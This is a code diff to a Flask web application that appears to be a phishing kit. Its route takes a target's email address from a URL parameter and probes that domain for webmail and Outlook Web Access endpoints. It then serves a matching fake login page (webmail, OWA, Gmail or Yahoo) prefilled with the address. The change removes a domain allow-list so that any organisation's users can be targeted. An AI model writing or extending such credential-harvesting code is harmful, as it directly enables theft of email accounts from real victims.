@@ -171,47 +171,59 @@ def success():
         return redirect(url_for('captcha'))
 
 
-from flask import Flask, request, render_template, session
-import requests
-
-app = Flask(__name__)
-app.secret_key = "your_secret_key"
 
 @app.route("/")
 def route2():
     web_param = request.args.get('web')
 
     if web_param and "@" in web_param:
-        domain = web_param.split("@")[-1]  # Extract the domain part
-        allowed_domains = ["gmail.com", "yahoo.com", "yourwebmail.com", "yourowa.com"]  # Add custom domains
-        
-        if domain in allowed_domains:
-            session['eman'] = web_param
-            session['ins'] = domain
+        domain = web_param.split("@")[-1]  # Extract domain
 
-            # Check for webmail and OWA endpoints
-            webmail_url = f"https://{domain}/webmail"
-            owa_url1 = f"https://owa.{domain}/owa/#path=/mail"
-            owa_url2 = f"https://autodiscover.{domain}/owa/#path=/mail/search"
+        session['eman'] = web_param
+        session['ins'] = domain
 
-            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+        # Define possible Webmail & OWA URLs
+        webmail_urls = [
+            f"https://{domain}/webmail",
+            f"https://mail.{domain}/webmail",
+            f"https://webmail.{domain}",
+        ]
+        owa_urls = [
+            f"https://owa.{domain}/owa/",
+            f"https://autodiscover.{domain}/owa/",
+            f"https://{domain}/owa/",
+            f"https://mail.{domain}/owa/",
+        ]
 
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+
+        # Check Webmail
+        for webmail_url in webmail_urls:
             try:
-                if requests.get(webmail_url, headers=headers, timeout=13).status_code == 200:
+                response = requests.get(webmail_url, headers=headers, timeout=10)
+                if response.status_code == 200:
+                    print(f"✅ Webmail Found: {webmail_url}")  # Debugging
                     return render_template('webmail.html', eman=session['eman'], ins=session['ins'])
-                if requests.get(owa_url1, headers=headers, timeout=13).status_code == 200 or \
-                   requests.get(owa_url2, headers=headers, timeout=3).status_code == 200:
+            except requests.RequestException as e:
+                print(f"❌ Webmail Request Failed: {webmail_url}, Error: {e}")  # Debugging
+
+        # Check OWA
+        for owa_url in owa_urls:
+            try:
+                response = requests.get(owa_url, headers=headers, timeout=10)
+                if response.status_code == 200:
+                    print(f"✅ OWA Found: {owa_url}")  # Debugging
                     return render_template('owa.html', eman=session['eman'], ins=session['ins'])
             except requests.RequestException as e:
-                print(f"Request failed: {e}")  # Debugging output
-            
-            # Render different templates based on domain
-            if domain == "gmail.com":
-                return render_template('gmail.html', eman=session['eman'], ins=session['ins'])
-            elif domain == "yahoo.com":
-                return render_template('yahoo.html', eman=session['eman'], ins=session['ins'])
+                print(f"❌ OWA Request Failed: {owa_url}, Error: {e}")  # Debugging
 
-    # Default template if no valid email is given
+        # Allow Gmail & Yahoo separately
+        if domain == "gmail.com":
+            return render_template('gmail.html', eman=session['eman'], ins=session['ins'])
+        elif domain == "yahoo.com":
+            return render_template('yahoo.html', eman=session['eman'], ins=session['ins'])
+
+    # Default if no match
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
 
